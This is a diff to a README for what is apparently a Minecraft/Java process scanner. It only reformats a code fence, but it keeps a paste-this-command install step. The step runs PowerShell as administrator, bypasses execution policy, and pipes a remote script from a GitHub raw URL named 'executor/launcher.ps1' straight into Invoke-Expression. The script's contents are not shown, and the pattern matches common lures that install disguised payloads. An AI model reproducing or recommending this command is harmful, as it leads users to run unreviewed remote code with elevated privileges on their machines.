@@ -9,7 +9,8 @@ The tool scans running Minecraft/Java processes and checks their loaded modules 
 You can download the tool from the releases or run this command on cmd(with administrator)
 
 ```bash
-powershell -Command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass; Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/q7dll/executor/main/launcher.ps1')"" ```
+powershell -Command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass; Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/q7dll/executor/main/launcher.ps1')"" 
+```
 
 ## How It Works
 
